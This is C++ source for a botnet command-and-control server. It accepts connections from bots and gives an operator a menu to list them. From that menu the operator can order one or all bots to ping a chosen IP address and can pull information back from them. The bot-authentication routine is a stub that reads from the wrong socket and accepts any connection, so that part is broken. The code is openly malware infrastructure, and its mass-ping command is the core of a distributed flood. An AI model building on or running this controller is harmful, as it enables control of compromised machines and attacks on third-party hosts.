#include "BotnetServer.h"

#include <thread>
#include <limits.h>

using namespace botnet;

BotnetServer::BotnetServer(int port, int max_connections, bool verbose) : server(port, max_connections, verbose) 
{ }


void BotnetServer::Start() {
	try {
		if (!this->SetUpServer()) {
			// No need for thread safety if reached here
			std::cerr << "Server: Failed to set up server, aborting" << std::endl;
			return;
		}
	}
	catch (const std::exception& e) {
		// No need for thread safety if reached here
		std::cerr << "Server: Failed to set up server " << std::string(e.what()) << std::endl;
		return;
	}

	// Run sepperate thread to get connections
	std::thread get_connections(&BotnetServer::GetConnections, this);

	// On this thread, run the botnet CLI
	this->BotnetCLI();

	// Cleanup
	if (get_connections.joinable()) {
		get_connections.join();
	}

}

void BotnetServer::GetMessages() {

}

void BotnetServer::GetConnections() {
	// Make a socket set containing only the
	// lister to use its select function
	Socket_Set<tcpSocket> listener_set(Socket_Set<tcpSocket>::READ);
	listener_set.AddSocket(this->MainSocket);

	// deque containing only the listener,
	// returned by listener_set's Select function
	std::deque<tcpSocket> listener_queue;
	tcpSocket tmpSocket;

	// Continue serving until asked to shut down by user
	while (this->continue_serving) {
		try {
			// Wait for an incoming connection
			listener_queue = listener_set.Select(-1);
		}
		catch (const std::exception& e) {
			ThreadSafeLog(std::string(e.what()) + "\n", std::cerr);
			continue;
		}
		
		for (auto& socket : listener_queue) {
			// If socket is the listener, try to accept the new socket
			if (socket.isListening()) {
				try {
					// If succedded in accepting new socket, add to master set
					if (socket.Accept(tmpSocket)) {
						// Check if incomming connection is really a bot
						if (this->AuthenticateBot(tmpSocket)) {
							std::unique_lock<std::mutex> master_set_ul(master_set_lock);
							this->master_set.AddSocket(tmpSocket);
							master_set_ul.unlock();
							ThreadSafeLog("Connection received by socket " + tmpSocket.GetIp() + "\n");
						}
					}
				}
				catch (const std::exception& e) {
					ThreadSafeLog("Error on receiving incoming connection\n", std::cerr);
				}
			}
		}
	}
}

bool BotnetServer::AuthenticateBot(const tcpSocket& connection) {
	std::string tmp;
	MainSocket.Recv(tmp, 1,1);
	return true;
}

std::string BotnetServer::GetCLIPrompt() const {
	std::string prompt;
	// Start count from 1, like "enum Commands"
	size_t command_cnt = 1;

	for (const std::string& command : this->GetCommandsList()) {
		prompt += std::to_string(command_cnt) + ": " + command + "\n";
		command_cnt++;
	}
	prompt += std::to_string(command_cnt) + ": Quit\n--> ";

	return prompt;
}

void BotnetServer::BotnetCLI() {
	std::string input;
	std::string command_output;
	int command = -1;

	// Quit command will always be the last command after all the commands.
	int quit_command = this->GetCommandsList().size() + 1;

	while (1) {
		ThreadSafeLogPrintAlways(this->GetCLIPrompt());
		
		input = ThreadSafeGetLine();

		try {
			command = std::stoi(input);
		}
		catch (const std::invalid_argument& e) {
			ThreadSafeLogPrintAlways("Please enter a valid number between 1 and " + std::to_string(quit_command) + "\n");
			continue;
		}
		catch (const std::exception& e) {
			ThreadSafeLogPrintAlways("Internal error. Please enter your choice again\n");
			continue;
		}
		if (command > quit_command || command < 1) {
			ThreadSafeLogPrintAlways("Please enter a valid number between 1 and " + std::to_string(quit_command) + "\n");
			continue;
		}
		if (command == quit_command) {
			this->continue_serving = false;
			break;
		}

		Commands command_given = static_cast<Commands>(command);
		try {
			// Execute the given command
			(this->*GetCommandFunction(command_given))();
		}
		catch (const std::exception& e) {
			ThreadSafeLog("Error on command: " + std::string(e.what()));
			continue;
		}

	}
}


/* Botnet commands void(void) functions */

void BotnetServer::PrintBots() {
	ThreadSafeLogPrintAlways("Bots:\n");

	std::unique_lock<std::mutex> master_set_ul(this->master_set_lock);
	auto sockets = this->master_set.GetAllSockets();
	master_set_ul.unlock();

	for (const auto bot : sockets) {
		// Only print if the bot is connected
		if (bot.isConnected()) {
			ThreadSafeLogPrintAlways(std::string("id: ") + std::to_string(bot.GetSockId()) + std::string(" IP: ") + bot.GetIp() + "\n");
		}
	}
	ThreadSafeLogPrintAlways("\n\n");
}

void BotnetServer::Ping() {
	std::unique_lock<std::mutex> master_set_ul(master_set_lock);
	std::deque<tcpSocket> bot_deque = master_set.GetAllSockets();
	master_set_ul.unlock();

	std::string IP_to_ping;
	char ping_code = static_cast<char>(PING);
	int bot_id;

	ThreadSafeLogPrintAlways("Enter bot id or '*' for all bots\n");
	bot_id = this->ReadID();

	ThreadSafeLogPrintAlways("Enter IP to ping:\n");
	IP_to_ping = this->ReadIP();

	// Send ping command to chosen connected bot, or all bots if bot_id == ALL_BOTS
	for (const tcpSocket& bot : bot_deque) {
		if ((bot_id == ALL_BOTS || bot_id == bot.GetSockId()) && bot.isConnected()) {
			if (bot.Send(static_cast<void*>(&ping_code), sizeof(char)) == sizeof(char)) {
				bot.Send(IP_to_ping);
			}
		}
	}

}

void BotnetServer::GetInfo() {
	std::unique_lock<std::mutex> master_set_ul(master_set_lock);
	std::deque<tcpSocket> bot_deque = master_set.GetAllSockets();
	master_set_ul.unlock();

	char get_info_code = static_cast<char>(GET_INFO);
	int bot_id;
	std::string info;
	static const size_t MAX_INFO_SIZE = 512;

	ThreadSafeLogPrintAlways("Enter bot id or '*' for all bots\n");
	bot_id = this->ReadID();

	// Send get_info command to chosen connected bot, or all bots if bot_id == ALL_BOTS
	for (const tcpSocket& bot : bot_deque) {
		if ((bot_id == ALL_BOTS || bot_id == bot.GetSockId()) && bot.isConnected()) {
			if (bot.Send(static_cast<void*>(&get_info_code), sizeof(char)) == sizeof(char)) {
				int retv = bot.Recv(info, MAX_INFO_SIZE);
				// If connection closed, close and remove socket
				if (retv == 0) {
					this->master_set.RemoveSocket(bot);
					bot.Close();
				}
				// If Recv succeded, print info, if not, skip it
				else if (retv > 0) {
					ThreadSafeLogPrintAlways("Bot " + std::to_string(bot.GetSockId()) + ": " + info);
				}
			}
		}
	}

}

/* Botnet commands helpers */

std::string BotnetServer::ReadIP() {
	std::string input;
	while (1) {
		input = ThreadSafeGetLine();

		if (!LegalIP(input)) {
			ThreadSafeLogPrintAlways("Enter legal IP address:\nXXX.XXX.XXX.XXX; 255 <= XXX >= 0\n");
		}
		else {
			break;
		}

	}
		return input;
}

bool BotnetServer::LegalIP(const std::string& IP_address) const {
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, IP_address.c_str(), &(sa.sin_addr));
    return (result != 0);
}

int BotnetServer::ReadID() {
	std::string input;
	int id;

	while (1) {
		input = ThreadSafeGetLine();

		if (input[0] == '*') {
			return ALL_BOTS;
		}
		else {
			try {
				id = std::stoi(input);
			}
			catch (const std::invalid_argument& e) {
				ThreadSafeLogPrintAlways("Please enter a valid number, or '*' for all bots\n");
				continue;
			}
			catch (const std::exception& e) {
				ThreadSafeLogPrintAlways("Internal error. Please enter your choice again\n");
				continue;
			}

			return id;
		}
	}
}